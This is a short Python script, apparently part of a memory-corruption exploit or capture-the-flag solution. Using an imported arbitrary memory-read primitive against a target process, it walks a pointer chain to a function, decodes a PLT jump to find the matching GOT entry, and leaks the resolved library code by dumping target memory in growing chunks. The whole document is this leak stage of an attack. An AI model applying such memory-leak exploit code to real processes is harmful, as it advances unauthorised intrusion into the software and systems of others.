import sys
from client import read_mem, read_ptr, tarea

some_func = read_ptr(read_ptr(read_ptr(tarea+0x18)))

idx = int(sys.argv[1])

if idx < 0:
    got_func = some_func
else:
    plt = some_func - 10063176
    plt_entry = plt + idx * 16
    q = read_mem(plt_entry, 6)
    assert q[:2] == b'\xff%', q
    got_entry = plt_entry + 6 + int.from_bytes(q[2:], 'little')
    got_func = read_ptr(got_entry)

data = b''

chunk_sz = 1

while True:
    data += read_mem(got_func + len(data), chunk_sz)
    if chunk_sz < 1024:
        chunk_sz *= 2
    print(len(data))
